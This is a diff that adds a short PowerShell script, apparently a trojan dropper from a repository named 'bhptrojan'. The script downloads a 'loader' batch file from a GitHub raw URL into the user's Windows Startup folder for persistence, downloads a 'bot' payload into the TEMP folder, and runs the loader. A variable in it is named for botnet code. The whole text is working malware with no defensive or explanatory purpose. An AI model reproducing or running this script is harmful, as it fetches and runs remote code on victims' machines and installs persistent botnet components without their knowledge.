@@ -1,0 +1,17 @@
+$temp = $env:TEMP;
+$userprof = $env:USERPROFILE;
+$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
+
+$botnetCode = 'Add-Type -AssemblyName System.IO.Compression.FileSystem'; #Always Useful
+
+$wc = [System.Net.WebClient]::new();
+$loader = "https://raw.githubusercontent.com/cyruschiira/bhptrojan/main/loader";
+$wc.DownloadFile("$loader","$startUpFolder\loader.bat");
+
+$bot = "https://raw.githubusercontent.com/cyruschiira/bhptrojan/main/bot";
+$wc.DownloadFile("$bot","$temp\bot.log");
+
+
+
+$cmd = (start-process $startUpFolder\loader.bat) 
+$cmd
